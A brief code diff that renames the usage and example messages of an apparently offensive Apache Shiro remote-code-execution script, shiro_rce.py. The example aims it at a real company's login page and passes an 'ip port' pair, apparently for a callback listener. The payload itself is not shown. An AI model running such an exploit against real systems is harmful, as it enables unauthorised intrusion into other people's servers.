@@ -37,8 +37,8 @@ def exp_shiro(url,cmd):
 
 if __name__=='__main__':
     if len(sys.argv)!=3:
-        print("Usage:"+"python3 shiro.py  url  \"ip port\"")
-        print("Example:"+"python3 shiro_crack.py http://www.baidu.com/login.do \"xxx.xxx.xx.xx 7777\"")
+        print("Usage:"+"python3 shiro_rce.py  url  \"ip port\"")
+        print("Example:"+"python3 shiro_rce.py http://www.baidu.com/login.do \"xxx.xxx.xx.xx 7777\"")
     else:
         try:
             url = sys.argv[1]
